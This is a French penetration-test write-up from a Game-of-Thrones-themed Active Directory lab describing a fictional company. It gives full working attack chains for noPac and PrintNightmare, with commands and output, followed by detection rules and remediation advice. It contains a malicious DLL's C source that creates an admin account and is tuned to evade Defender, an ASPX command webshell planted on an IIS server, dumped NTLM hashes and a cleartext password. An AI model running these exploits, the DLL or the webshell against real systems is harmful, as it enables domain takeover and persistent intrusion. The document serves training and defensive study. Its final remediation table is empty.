# SC-AD-005 — noPac : SamAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)

## Classification

| Champ | Valeur |
|-------|--------|
| **Code scénario** | SC-AD-005 |
| **Nom** | noPac — SamAccountName Spoofing & KDC Fallback |
| **Cible** | WINTERFELL — DC02 north.sevenkingdoms.local (192.168.10.11) |
| **VLAN** | 10 — AD Lab (192.168.10.0/24) |
| **Sévérité** | 🔴 Critique |
| **CVSS 3.1** | 9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| **CWE** | CWE-269 (Improper Privilege Management), CWE-290 (Authentication Bypass) |
| **CVE** | CVE-2021-42278 (SamAccountName Spoofing), CVE-2021-42287 (KDC PAC Fallback) |
| **MITRE ATT&CK** | T1558 (Steal or Forge Kerberos Tickets), T1003.006 (DCSync), T1078.002 (Valid Accounts: Domain Accounts) |
| **Mayfly Reference** | Part 5 — https://mayfly277.github.io/posts/GOADv2-pwning-part5/ |
| **Prérequis** | Un compte de domaine valide (hodor:hodor) |
| **Résultat** | Domain Admin north.sevenkingdoms.local — DCSync complet |
| **Date** | Mars 2026 |
| **Auteur** | Nadyr Chouarhi (hik3nR00t) |

---

## Résumé exécutif

### Pour un recruteur

Ce scénario démontre l'exploitation manuelle de **deux CVE chaînés** (noPac) permettant à un utilisateur de domaine standard d'obtenir les droits **Domain Admin** en moins de 10 minutes, sans aucun exploit logiciel complexe. En abusant d'un défaut de validation du nom de compte machine par le KDC (CVE-2021-42278) et d'un mécanisme de fallback Kerberos (CVE-2021-42287), un attaquant peut forger un ticket de service avec les privilèges du Domain Controller. La chaîne complète aboutit à un DCSync sur `north.sevenkingdoms.local` avec extraction de tous les hashes NTLM du domaine, incluant `krbtgt` et `Administrator`.

### Pour un auditeur ISO 27001 / NIS2

Ce scénario met en évidence des non-conformités critiques sur la gestion des identités machine et la sécurité du protocole Kerberos :

- **A.8.2 (Privileged Access Rights)** — Tout utilisateur de domaine peut créer jusqu'à 10 comptes machine (`MachineAccountQuota = 10`), sans approbation ni supervision. Ce droit non restreint constitue le prérequis direct de l'exploitation.
- **A.8.8 (Management of Technical Vulnerabilities)** — Les patches KB5008380 et KB5008602 (décembre 2021) corrigeant CVE-2021-42287 et CVE-2021-42278 n'étaient pas appliqués sur WINTERFELL au moment de l'exploitation. L'absence de gestion des vulnérabilités critiques expose le domaine à une compromission totale.
- **A.8.15 (Logging)** — Aucun monitoring des créations/renommages de comptes machine (Event IDs 4741, 4742, 5136) n'était en place. L'attaque s'est déroulée sans alerte.
- **A.8.16 (Monitoring Activities)** — Aucune détection des requêtes Kerberos anormales (TGT pour un compte portant le nom d'un DC sans dollar) n'était configurée.
- **NIS2 Art. 21 §2(e)** — Absence de politique de gestion des patches pour les vulnérabilités critiques affectant l'infrastructure d'authentification.

### Pour un RSSI

Un compte utilisateur standard (`hodor:hodor`) a permis la compromission totale du domaine `north.sevenkingdoms.local` en 8 étapes manuelles. Le hash `krbtgt` extrait permet la création de **Golden Tickets** offrant un accès persistant indétectable au domaine. L'impact dépasse le seul domaine north — via les relations de confiance inter-forêts, la compromission peut s'étendre à `sevenkingdoms.local` et `essos.local`.

---

## Diagramme réseau

```mermaid
graph TD
    A[Kali Linux\n10.10.10.2 / WireGuard] -->|VLAN 10 - 192.168.10.0/24| B
    B[WINTERFELL DC02\n192.168.10.11\nnorth.sevenkingdoms.local]
    B -->|Trust bidirectionnel| C[KINGSLANDING DC01\n192.168.10.10\nsevenkingdoms.local]
    B -->|Trust cross-forest| D[MEEREEN DC03\n192.168.10.12\nessos.local]
    E[CASTELBLACK SRV\n192.168.10.22] -->|Membre| B
    F[BRAAVOS SRV\n192.168.10.23] -->|Membre| D

    style A fill:#c0392b,color:#fff
    style B fill:#922b21,color:#fff
    style C fill:#1a5276,color:#fff
    style D fill:#1a5276,color:#fff
```

---

## Kill Chain

```mermaid
sequenceDiagram
    participant K as Kali (hodor)
    participant DC as WINTERFELL KDC
    participant AD as Active Directory

    K->>AD: addcomputer PWNED$ cree (MachineAccountQuota=10)
    K->>AD: bloodyAD sAMAccountName PWNED$ = WINTERFELL sans dollar
    K->>DC: getTGT pour WINTERFELL obtenu (CVE-2021-42278)
    K->>AD: bloodyAD rollback sAMAccountName = PWNED$
    K->>DC: getST -self S4U2Self avec TGT WINTERFELL
    DC->>DC: Cherche WINTERFELL not found
    DC->>DC: Fallback cherche WINTERFELL$ trouve le vrai DC (CVE-2021-42287)
    DC->>K: TGS Administrator CIFS/WINTERFELL avec droits DC
    K->>DC: secretsdump DCSync complet
    DC->>K: Tous les hashes NTLM du domaine
```

---

## Scope & Méthodologie

| Paramètre | Valeur |
|-----------|--------|
| **Cible principale** | WINTERFELL (192.168.10.11) — DC north.sevenkingdoms.local |
| **Compte initial** | hodor:hodor (utilisateur de domaine standard) |
| **Outils utilisés** | netexec, impacket (addcomputer, getTGT, getST), bloodyAD, secretsdump |
| **Méthode** | Exploitation manuelle — pas de Metasploit |
| **Durée** | ~15 minutes |
| **Détection** | Aucune alerte générée |

---

## Phases d'exploitation

### Phase 1 — Vérification du MachineAccountQuota

Tout utilisateur AD peut créer des comptes machine si `ms-DS-MachineAccountQuota > 0`. Valeur par défaut : 10.

```bash
netexec ldap 192.168.10.11 -u hodor -p hodor -d north.sevenkingdoms.local -M maq
```

```
LDAP  192.168.10.11  389  WINTERFELL  [+] north.sevenkingdoms.local\hodor:hodor
MAQ   192.168.10.11  389  WINTERFELL  MachineAccountQuota: 10
```

Prerequis confirme — creation de compte machine autorisee.

---

### Phase 2 — Scan de vulnerabilite noPac

Le module `nopac` de netexec tente d'obtenir un TGT avec un nom de DC sans dollar et verifie si le KDC accepte.

```bash
netexec smb 192.168.10.11 -u hodor -p hodor -d north.sevenkingdoms.local -M nopac
```

```
NOPAC  192.168.10.11  445  WINTERFELL  TGT with PAC size 1582
NOPAC  192.168.10.11  445  WINTERFELL  TGT without PAC size 793
NOPAC  192.168.10.11  445  WINTERFELL  VULNERABLE
```

CVE-2021-42278 + CVE-2021-42287 confirmes sur WINTERFELL.

---

### Phase 3 — Creation du compte machine

```bash
impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'Password123!' -dc-ip 192.168.10.11 north.sevenkingdoms.local/hodor:hodor
```

```
[*] Successfully added machine account PWNED$ with password Password123!.
```

---

### Phase 4 — Rename : PWNED$ vers WINTERFELL (CVE-2021-42278)

On modifie le `sAMAccountName` du compte machine pour qu'il soit identique au nom NetBIOS du DC, sans le dollar. Le KDC ne valide pas ce changement.

```bash
bloodyAD -d north.sevenkingdoms.local -u hodor -p hodor --host 192.168.10.11 set object 'PWNED$' sAMAccountName -v 'WINTERFELL'
```

```
[+] PWNED$'s sAMAccountName has been updated
```

---

### Phase 5 — Obtention du TGT pour WINTERFELL

Le KDC delivre un TGT pour le compte WINTERFELL, identique au DC. C'est CVE-2021-42278 exploite.

```bash
impacket-getTGT -dc-ip 192.168.10.11 north.sevenkingdoms.local/WINTERFELL:'Password123!'
```

```
[*] Saving ticket in WINTERFELL.ccache
```

---

### Phase 6 — Rollback du nom de compte

On renomme le compte machine vers son nom original AVANT de demander le TGS. C'est le declencheur de CVE-2021-42287.

```bash
bloodyAD -d north.sevenkingdoms.local -u hodor -p hodor --host 192.168.10.11 set object 'WINTERFELL' sAMAccountName -v 'PWNED$'
```

```
[+] WINTERFELL's sAMAccountName has been updated
```

---

### Phase 7 — S4U2Self : obtention du TGS Administrator (CVE-2021-42287)

On presente le TGT WINTERFELL au KDC pour demander un TGS au nom d'Administrator. Le KDC cherche WINTERFELL, pas trouve, fallback WINTERFELL$, trouve le vrai DC, delivre un TGS avec les droits Domain Admin.

> **Note technique** : impacket-getST v0.14 presente un bug avec -force-forwardable. Utiliser getST.py de /opt_test/impacket avec les options -self et -altservice (PR #1202 + #1224).

```bash
export KRB5CCNAME=WINTERFELL.ccache
python3 /opt_test/impacket/examples/getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 192.168.10.11 'north.sevenkingdoms.local/WINTERFELL' -debug
```

```
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Changing service from WINTERFELL@NORTH.SEVENKINGDOMS.LOCAL to CIFS/winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL
[*] Saving ticket in administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
```

---

### Phase 8 — DCSync : extraction des hashes NTLM

```bash
export KRB5CCNAME='administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache'
impacket-secretsdump -k -no-pass -dc-ip 192.168.10.11 @'winterfell.north.sevenkingdoms.local'
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5883cbf00ea968b503b20628fb83cc55:::
robb.stark:1114:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
[DefaultPassword] NORTH\robb.stark:sexywolfy
```

---

### Phase 9 — Nettoyage OPSEC

```bash
impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'Password123!' -dc-ip 192.168.10.11 -delete north.sevenkingdoms.local/administrator -hashes aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4
```

---

## Credentials recuperes

| Compte | Hash NTLM | Type | Domaine |
|--------|-----------|------|---------|
| Administrator | dbd13e1c4e338284ac4e9874f7de6ef4 | Domain Admin | north.sevenkingdoms.local |
| krbtgt | 5883cbf00ea968b503b20628fb83cc55 | Compte Kerberos | north.sevenkingdoms.local |
| robb.stark | 831486ac7f26860c9e2f51ac91e1a07a / sexywolfy | Utilisateur | north.sevenkingdoms.local |
| eddard.stark | d977b98c6c9282c5c478be1d97b237b8 | Utilisateur (bot) | north.sevenkingdoms.local |
| jon.snow | b8d76e56e9dac90539aff05e3ccb1755 | Utilisateur | north.sevenkingdoms.local |
| hodor | 337d2667505c203904bd899c6c95525e | Utilisateur | north.sevenkingdoms.local |
| WINTERFELL$ | a9bb66a8c84c8138e1834e054396027a | Compte machine DC | north.sevenkingdoms.local |

---

## Impact technique

| Dimension | Niveau | Detail |
|-----------|--------|--------|
| **Confidentialite** | Critique | Tous les hashes NTLM du domaine extraits — krbtgt compromis |
| **Integrite** | Critique | Modification possible de tout objet AD, GPO, comptes |
| **Disponibilite** | Critique | Arret possible de tous les services du domaine |
| **Perimetre** | Etendu | Via trusts : sevenkingdoms.local et essos.local potentiellement compromis |
| **Persistance** | Critique | Golden Ticket via krbtgt — persistance sans rotation krbtgt |

---

## Impact metier — MediaTech Groupe SA

### Synthese narrative

La compromission totale du controleur de domaine WINTERFELL equivaut a une prise de controle complete de l'infrastructure d'identite de MediaTech Groupe SA pour le domaine nord. Un attaquant disposant du hash krbtgt peut creer des Golden Tickets valables 10 ans, maintenir un acces indetectable a l'ensemble du SI, et se propager aux domaines partenaires via les relations de confiance. L'exploitation ne necessite qu'un compte utilisateur basique — vecteur accessible a tout employe malveillant ou attaquant ayant compromis un poste de travail.

### Estimation financiere

| Poste | Estimation |
|-------|-----------|
| Incident Response (investigation + remediation) | 80 000 — 150 000 EUR |
| Reconstruction partielle de l'AD | 50 000 — 100 000 EUR |
| Perte d'exploitation (arret services) | 20 000 — 50 000 EUR/jour |
| Notification RGPD + audit CNIL | 30 000 — 60 000 EUR |
| Sanctions NIS2 potentielles | Jusqu'a 2% CA mondial |
| **Total estime** | **180 000 — 360 000 EUR** |

### Impact reglementaire

| Referentiel | Article | Non-conformite |
|-------------|---------|----------------|
| **RGPD** | Art. 32 | Absence de mesures techniques adaptees sur l'infrastructure d'authentification |
| **RGPD** | Art. 33 | Violation notifiable a la CNIL sous 72h si donnees personnelles accessibles |
| **NIS2** | Art. 21 §2(e) | Absence de politique de gestion des vulnerabilites critiques |
| **NIS2** | Art. 21 §2(a) | Politique de securite des systemes d'information insuffisante |
| **ISO 27001** | A.8.8 | Gestion des vulnerabilites techniques absente |
| **ISO 27001** | A.8.2 | Droits d'acces privilegies non restreints (MachineAccountQuota) |

### Top 5 actions prioritaires

**0-24h (urgence)**
1. Appliquer KB5008380 (CVE-2021-42287) et KB5008602 (CVE-2021-42278) sur tous les DC
2. Rotation immediate du mot de passe krbtgt (deux fois, intervalle 10h) pour invalider les Golden Tickets

**Sous 1 semaine**
3. Positionner MachineAccountQuota = 0 via GPO — deleguer la creation de comptes machine aux seuls admins

**Sous 1 mois**
4. Activer la surveillance des Event IDs 4741, 4742, 5136 dans le SIEM
5. Deployer les groupes Protected Users sur tous les comptes administrateurs

### Decisions attendues du COMEX

- Valider le plan de patching d'urgence sur l'ensemble des Domain Controllers (WINTERFELL, KINGSLANDING, MEEREEN) — delai maximum 24h
- Declencher une analyse d'impact RGPD — identifier si des donnees personnelles etaient accessibles via le compte Administrator compromis
- Mandater un audit complet des relations de confiance inter-forets pour evaluer l'etendue de la compromission potentielle vers sevenkingdoms.local et essos.local
- Valider un budget SOC pour le deploiement d'une surveillance Kerberos temps reel (Wazuh + regles Sigma)
- Nommer un responsable de la gestion des vulnerabilites AD avec SLA de patching critique < 72h

---

## Detection SOC / SIEM

### Event IDs Windows

| Event ID | Source | Description | Indicateur |
|----------|--------|-------------|------------|
| **4741** | Security | Compte ordinateur cree | Creation de PWNED$ par hodor |
| **4742** | Security | Compte ordinateur modifie | sAMAccountName vers WINTERFELL |
| **5136** | Security | Objet DS modifie | Attribut sAMAccountName modifie |
| **4768** | Security | TGT Kerberos demande | TGT pour WINTERFELL sans dollar |
| **4769** | Security | TGS Kerberos demande | S4U2Self pour Administrator |
| **4662** | Security | Operation sur objet AD | DCSync — replication DRSUAPI |

### Regles Sigma

```yaml
# Regle 1 — Creation compte machine sans dollar
title: Machine Account Created Without Dollar Sign
id: sc-ad-005-001
status: experimental
description: Detecte la creation d'un compte machine dont le sAMAccountName ne contient pas $
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4741
    filter:
        SAMAccountName|endswith: '$'
    condition: selection and not filter
level: critical
tags:
    - attack.t1558
    - cve-2021-42278

---
# Regle 2 — Renommage de compte machine vers nom de DC
title: Machine Account Renamed to DC Name
id: sc-ad-005-002
status: experimental
description: Detecte le renommage d'un compte machine vers le nom d'un DC existant
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5136
        AttributeLDAPDisplayName: sAMAccountName
    condition: selection
level: high
tags:
    - attack.t1558
    - cve-2021-42278
    - cve-2021-42287
```

### IOC

```
# Comptes machine suspects
sAMAccountName sans $ = creation anormale
sAMAccountName = nom d'un DC existant = renommage suspect

# Fichiers ccache generes
WINTERFELL.ccache
administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache

# Hashes compromis
Administrator NTLM : dbd13e1c4e338284ac4e9874f7de6ef4
krbtgt NTLM       : 5883cbf00ea968b503b20628fb83cc55
```

---

## Remediation Secure by Design

### Actions prioritaires

| Priorite | Action | Methode | Delai |
|----------|--------|---------|-------|
| CRITIQUE | Appliquer KB5008380 + KB5008602 | Windows Update / WSUS | 0-24h |
| CRITIQUE | Rotation krbtgt x2 | Set-ADAccountPassword | 0-24h |
| CRITIQUE | MachineAccountQuota = 0 | GPO / PowerShell | J+1 |
| ELEVE | Protected Users group | ADAC / PowerShell | 1 semaine |
| ELEVE | Surveillance Event IDs | SIEM / Wazuh | 1 semaine |

### Commandes de remediation

```powershell
# MachineAccountQuota = 0
Set-ADDomain -Identity north.sevenkingdoms.local -Replace @{"ms-DS-MachineAccountQuota"="0"}

# Rotation krbtgt (repeter 2 fois avec 10h d'intervalle)
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "NewKrbtgtP@ssw0rd!" -AsPlainText -Force)

# Ajouter les admins dans Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator","jeor.mormont"

# Verifier le quota
Get-ADDomain | Select-Object -ExpandProperty 'ms-DS-MachineAccountQuota'
```

---

## Architecture cible securisee

```mermaid
graph TD
    A[Utilisateur Domaine] -->|MachineAccountQuota = 0| B[Creation compte machine refusee]
    C[Admin delegue] -->|Creation autorisee| D[Compte machine cree avec dollar]
    D -->|KB5008380 + KB5008602| E[KDC valide le sAMAccountName]
    E -->|Refuse TGT si nom = DC sans dollar| F[Exploit bloque]
    G[SIEM Wazuh] -->|Event 4741 4742 5136| H[Alerte creation renommage compte machine]
    H -->|SOC Response| I[Investigation moins de 30 min]

    style B fill:#c0392b,color:#fff
    style F fill:#27ae60,color:#fff
    style I fill:#27ae60,color:#fff
```

---

## References

| Reference | URL |
|-----------|-----|
| Mayfly277 GOAD Part 5 | https://mayfly277.github.io/posts/GOADv2-pwning-part5/ |
| CVE-2021-42278 | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278 |
| CVE-2021-42287 | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287 |
| Charlie Clark Weaponisation | https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html |
| KB5008380 patch 42287 | https://support.microsoft.com/kb/5008380 |
| KB5008602 patch 42278 | https://support.microsoft.com/kb/5008602 |
| MITRE T1558 | https://attack.mitre.org/techniques/T1558/ |
| MITRE T1003.006 DCSync | https://attack.mitre.org/techniques/T1003/006/ |
| impacket PR 1202 | https://github.com/SecureAuthCorp/impacket/pull/1202 |
| impacket PR 1224 | https://github.com/SecureAuthCorp/impacket/pull/1224 |

---

*Auteur : Nadyr Chouarhi (hik3nR00t) | HikenRoot Forge | Mars 2026*
*Environnement : GOAD v3 — MediaTech Groupe SA (fictif)*

---

# SC-AD-005b — PrintNightmare (CVE-2021-1675)

## Classification

| Champ | Valeur |
|-------|--------|
| **Code scénario** | SC-AD-005b |
| **Nom** | PrintNightmare — RCE via Print Spooler |
| **Cible** | MEEREEN — DC03 essos.local (192.168.10.12) |
| **VLAN** | 10 — AD Lab (192.168.10.0/24) |
| **Sévérité** | 🔴 Critique |
| **CVSS 3.1** | 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| **CVE** | CVE-2021-1675 |
| **MITRE ATT&CK** | T1068 (Exploitation for Privilege Escalation), T1136 (Create Account), T1003.003 (NTDS) |
| **Mayfly Reference** | Part 5 — https://mayfly277.github.io/posts/GOADv2-pwning-part5/ |
| **Prérequis** | Compte de domaine essos valide (jorah.mormont:H0nnor!) |
| **Résultat** | SYSTEM sur MEEREEN DC — DCSync essos.local complet |
| **Date** | Mars 2026 |
| **Auteur** | Nadyr Chouarhi (hik3nR00t) |

---

## Résumé exécutif

### Pour un recruteur

PrintNightmare exploite une vulnérabilité dans le service Windows Print Spooler pour exécuter du code arbitraire en tant que **SYSTEM**. Avec un simple compte de domaine `jorah.mormont`, le service spooler de MEEREEN (DC essos.local) charge une DLL malveillante depuis un partage SMB Kali, créant un compte administrateur de domaine. Le DCSync complet sur essos.local en résulte — 20 hashes NTLM extraits incluant `krbtgt` et `Administrator`.

### Pour un auditeur ISO 27001 / NIS2

- **A.8.8 (Management of Technical Vulnerabilities)** — CVE-2021-1675 publiée en juin 2021, patch disponible depuis juillet 2021. MEEREEN non patché au moment de l'exploitation.
- **A.8.2 (Privileged Access Rights)** — Le service Print Spooler tourne en contexte SYSTEM sur un DC. Aucune justification métier d'activer l'impression sur un contrôleur de domaine.
- **A.8.15 (Logging)** — Aucune détection du chargement de DLL externe via le spooler.
- **NIS2 Art. 21 §2(e)** — Absence de gestion des vulnérabilités critiques sur infrastructure d'authentification.

### Pour un RSSI

Le service Print Spooler n'a aucune légitimité sur un DC. Son activation expose l'infrastructure d'authentification à une compromission totale via un vecteur réseau sans interaction utilisateur. La désactivation du spooler sur tous les DC est une mesure de durcissement fondamentale documentée depuis 2021.

---

## Kill Chain

```mermaid
sequenceDiagram
    participant K as Kali (jorah.mormont)
    participant S as SMB Share (10.10.10.2)
    participant M as MEEREEN Spooler (SYSTEM)
    participant AD as essos.local AD

    K->>K: Compilation DLL adduser (mingw32-gcc)
    K->>S: impacket-smbserver ATTACKERSHARE /tmp
    K->>M: CVE-2021-1675.py RpcAddPrinterDriverEx
    M->>S: Charge pnightmare2.dll depuis UNC path
    M->>AD: NetUserAdd pnightmare2 en tant que SYSTEM
    M->>AD: NetLocalGroupAddMembers Administrators
    K->>M: netexec smb --ntds
    M->>K: 20 hashes NTLM essos.local
```

---

## Phases d'exploitation

### Phase 1 — Vérification du service Spooler

```bash
netexec smb 192.168.10.12 -u jorah.mormont -p 'H0nnor!' -d essos.local -M spooler
```

```
SPOOLER  192.168.10.12  445  MEEREEN  Spooler service enabled
```

---

### Phase 2 — Compilation de la DLL malveillante

Payload qui utilise les API Win32 natives `NetUserAdd` + `LookupAccountName` + `NetLocalGroupAddMembers` pour bypass Defender WS2016.

```bash
cat > /tmp/adduser2.c << 'EOF'
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>

DWORD CreateAdminUserInternal(void) {
    NET_API_STATUS rc;
    BOOL b;
    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;
    DWORD cbSid = 256;
    BYTE Sid[256];
    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];
    memset(&ud, 0, sizeof(ud));
    ud.usri1_name        = _T("pnightmare2");
    ud.usri1_password    = _T("Test123456789!");
    ud.usri1_priv        = USER_PRIV_USER;
    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;
    ud.usri1_script_path = NULL;
    rc = NetUserAdd(NULL, 1, (LPBYTE)&ud, NULL);
    if (rc != NERR_Success) return rc;
    b = LookupAccountName(NULL, ud.usri1_name, Sid, &cbSid, Domain, &cbDomain, &snu);
    if (!b) return GetLastError();
    memset(&gd, 0, sizeof(gd));
    gd.lgrmi0_sid = (PSID)Sid;
    NetLocalGroupAddMembers(NULL, _T("Administrators"), 0, (LPBYTE)&gd, 1);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) CreateAdminUserInternal();
    return TRUE;
}
EOF

x86_64-w64-mingw32-gcc -shared -o /tmp/pnightmare2.dll /tmp/adduser2.c -lnetapi32
```

> **Note** : Le payload `net user` simple est détecté par Defender WS2016. L'API Win32 directe via `LookupAccountName` + `NetLocalGroupAddMembers` avec SID bypass la détection.

---

### Phase 3 — Montage du partage SMB

```bash
sudo impacket-smbserver ATTACKERSHARE /tmp -smb2support
```

---

### Phase 4 — Exploitation PrintNightmare

```bash
python3 /home/hiken/VHL/VHL_Pro/WKS_101/CVE-2021-1675/CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@192.168.10.12 '\\10.10.10.2\ATTACKERSHARE\pnightmare2.dll'
```

```
[*] Connecting to ncacn_np:192.168.10.12[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_7b3eed059f4c3e41\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.10.2\ATTACKERSHARE\pnightmare2.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Stage5: 0
[+] Exploit Completed
```

---

### Phase 5 — Validation et DCSync

```bash
netexec smb 192.168.10.12 -u pnightmare2 -p 'Test123456789!' -d essos.local
```

```
SMB  192.168.10.12  445  MEEREEN  [+] essos.local\pnightmare2:Test123456789! (Pwn3d!)
```

```bash
netexec smb 192.168.10.12 -u pnightmare2 -p 'Test123456789!' -d essos.local --ntds
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1d8956cac33793f4d9f14f67eb40ec2a:::
daenerys.targaryen:1114:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
viserys.targaryen:1115:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
jorah.mormont:1117:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
missandei:1118:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::
[+] Dumped 20 NTDS hashes to /home/hiken/.nxc/logs/ntds/MEEREEN_192.168.10.12_2026-03-02_192742.ntds
```

---

### Phase 6 — Nettoyage OPSEC

```bash
netexec smb 192.168.10.12 -u pnightmare2 -p 'Test123456789!' -d essos.local -x 'net user pnightmare /delete && net user pnightmare2 /delete'
```

> **Traces résiduelles** : Les DLL chargées restent dans `C:\Windows\System32\spool\drivers\x64\3\` et `C:\Windows\System32\spool\drivers\x64\3\Old\`. Suppression manuelle requise si accès WinRM disponible.

---

### Phase 5 — IIS WebShell (Post-Exploitation CASTELBLACK)

CASTELBLACK héberge un serveur IIS avec ASP.NET. Avec un accès admin obtenu via noPac, on dépose un webshell ASPX dans le répertoire IIS pour obtenir un accès persistant indépendant des credentials AD.

**Pourquoi c'est utile** : même si les mots de passe et les hash sont rotés, le webshell reste actif tant que le fichier n'est pas supprimé. C'est un mécanisme de persistance web classique, documenté dans MITRE ATT&CK T1505.003.

**1. Vérification IIS actif**

```bash
netexec smb 192.168.10.22 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -x 'dir C:\inetpub\wwwroot\'
```

```
Directory of C:\inetpub\wwwroot
12/03/2025  03:56 PM    <DIR>          aspnet_client
12/03/2025  03:56 PM    <DIR>          bin
12/03/2025  01:11 PM               616 Default.aspx
12/03/2025  03:42 PM               703 iisstart.htm
12/03/2025  01:11 PM               149 index.html
12/03/2025  01:11 PM             1,199 Web.config
```

IIS actif avec ASP.NET.

**2. Création et upload du webshell**

```bash
cat > /tmp/shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + Request["cmd"];
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
EOF
```

Upload via SMB :

```bash
impacket-smbclient north.sevenkingdoms.local/administrator@192.168.10.22 -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4'
# use C$
# cd inetpub\wwwroot
# put /tmp/shell.aspx
```

**3. Validation RCE via webshell**

```bash
curl -k 'http://192.168.10.22/shell.aspx?cmd=whoami'
```

```
<pre>iis apppool\defaultapppool
</pre>
```

```bash
curl -k 'http://192.168.10.22/shell.aspx?cmd=hostname%20%26%26%20ipconfig'
```

```
<pre>castelblack
Windows IP Configuration
Ethernet adapter Ethernet:
   IPv4 Address. . . . . . . . . . . : 192.168.10.22
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.10.1
</pre>
```

RCE confirmée en tant que `iis apppool\defaultapppool`.

**4. Cleanup**

```bash
netexec smb 192.168.10.22 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -x 'del C:\inetpub\wwwroot\shell.aspx'
```

---

### Annexe — KrbRelayUp (non exploitable)

KrbRelayUp combine un relay LDAP local via DCOM + RBCD pour escalader de Domain User à SYSTEM sur la machine locale. Les conditions théoriques sont réunies sur CASTELBLACK (LDAP signing non enforced, channel binding "Never", MAQ=10). L'outil échoue cependant à créer le compte machine via le relay interne : `Could not add new computer account: An operation error occurred.` C'est une limitation connue du relay DCOM→LDAP sur certaines versions de WS2019.

---

## Credentials récupérés

| Compte | Hash NTLM | Type | Domaine |
|--------|-----------|------|---------|
| Administrator | 54296a48cd30259cc88095373cec24da | Domain Admin | essos.local |
| krbtgt | 1d8956cac33793f4d9f14f67eb40ec2a | Compte Kerberos | essos.local |
| daenerys.targaryen | 34534854d33b398b66684072224bb47a | Utilisateur | essos.local |
| viserys.targaryen | d96a55df6bef5e0b4d6d956088036097 | Utilisateur | essos.local |
| jorah.mormont | 4d737ec9ecf0b9955a161773cfed9611 | Utilisateur | essos.local |
| missandei | 1b4fd18edf477048c7a7c32fda251cec | Utilisateur | essos.local |

---

## Détection SOC / SIEM

| Event ID | Description | Indicateur |
|----------|-------------|------------|
| **4697** | Service installé | Driver imprimante chargé depuis UNC path |
| **7045** | Nouveau service | Spooler charge DLL externe |
| **4741** | Compte créé | pnightmare/pnightmare2 créés par SYSTEM |
| **4728** | Membre ajouté au groupe | Ajout dans Administrators |

### Règle Sigma

```yaml
title: PrintNightmare DLL Load via Spooler
id: sc-ad-005b-001
status: experimental
description: Detecte le chargement d'une DLL depuis un chemin UNC par le spooler
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
        ServiceFileName|contains: '\??\UNC\'
    condition: selection
level: critical
tags:
    - attack.t1068
    - cve-2021-1675
```

```yaml
title: ASPX WebShell Created in IIS Directory
id: sc-ad-005-webshell
status: experimental
description: Détecte la création d'un fichier ASPX dans le répertoire IIS wwwroot
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 11
        TargetFilename|contains: '\inetpub\wwwroot\'
        TargetFilename|endswith: '.aspx'
    condition: selection
level: critical
tags:
    - attack.persistence
    - attack.t1505.003
```

---

## Remédiation

| Priorité | Action | Commande | Délai |
|----------|--------|----------|-------|
